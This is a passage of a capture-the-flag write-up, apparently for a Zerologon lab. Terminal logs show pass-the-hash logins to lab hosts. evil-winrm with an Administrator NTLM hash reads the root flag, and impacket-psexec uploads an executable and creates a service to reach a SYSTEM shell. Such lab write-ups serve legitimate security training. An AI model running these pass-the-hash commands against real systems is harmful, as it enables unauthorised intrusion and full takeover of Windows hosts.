
```sh
┌──(kali㉿proxli)-[~/exploits]
└─$ evil-winrm -i 10.10.232.150 -u "Administrator" -H 3f3ef89114fb063e3d7fc23c20f65568
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline                                                                                              
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                         
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
hololive\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/20/2020   2:02 PM             24 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
THM{Zer0Log0nD4rkTh1rty}
```


and system:
```sh
┌──(kali㉿proxli)-[~/exploits]
└─$ impacket-psexec -hashes :3f3ef89114fb063e3d7fc23c20f65568 'Administrator'@10.10.165.51
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.165.51.....
[*] Found writable share ADMIN$
[*] Uploading file QsKzMJmA.exe
[*] Opening SVCManager on 10.10.165.51.....
[*] Creating service jBxX on 10.10.165.51.....
[*] Starting service jBxX.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```
